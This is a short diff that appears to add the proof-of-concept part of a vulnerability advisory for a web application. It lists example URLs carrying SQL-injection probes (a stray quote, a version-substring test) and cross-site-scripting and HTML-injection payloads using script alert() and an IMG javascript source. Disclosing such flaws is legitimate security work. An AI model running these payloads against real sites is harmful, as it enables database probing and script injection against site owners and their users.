@@ -1,0 +1,10 @@
+For the SQL-injection issues:
+http://www.example.com/[installdir]/events_view.php?eid=69&#039;
+http://www.example.com/[installdir]/events_clndr_view.php?id=1 and substring(@@version,1,1)=4
+
+For the cross-site-scripting issues:
+http://www.example.com/[installdir]/groups_profile.php?gid=311&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;
+http://www.example.com/[installdir]/adv_cat.php?cat_id=4&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&amp;razd_id=45&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;
+
+For the HTML-injection issue:
+&lt;IMG SRC=javascript:alert(&#039;XSS&#039;)&gt;
